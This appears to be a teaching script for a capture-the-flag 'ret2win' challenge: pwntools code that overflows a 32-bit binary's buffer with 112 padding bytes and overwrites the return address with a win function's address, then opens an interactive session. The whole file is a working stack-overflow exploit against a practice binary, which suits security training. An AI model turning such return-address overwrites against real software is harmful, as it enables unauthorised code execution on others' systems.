# Install pip3 and pwntools:
# sudo apt install python3-pip; pip3 install --user pwntools
# Here's a example script for this challenge:

from pwn import *

local = True

if local:
	r = process("./ret2win")
else:
	r = remote("192.168.196.50", 5004)

s = r.recvuntil(b"> ")

r.sendline(b"1") # string length
s = r.recvuntil(b"Give me a string: ")

# Change 0 to the correct number of A's to rewrite the return address with the address you want to jump to
n = 112

# Remember, we should always check what binary we are dealing with:
# $ file ret2win
# ret2win: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ee7de11974d30585071a95b25df3301cffdffece, not stripped
# 
# p32() -> converts an address to the string representation - 4 bytes
# Same as struct.pack("<I", 0x804863d)
#
# For 64 bit binaries, we can use p64() - 8 bytes

# we should get the address of the win function, using a disassembler, debugger, etc:
win_function = p32(0x804863d)
# or we can just use pwntools:
# elf = ELF("./ret2win")
# win_function = elf.symbols["win"]

payload = b"A"*n + win_function
print(payload)
r.sendline(payload)

r.interactive()
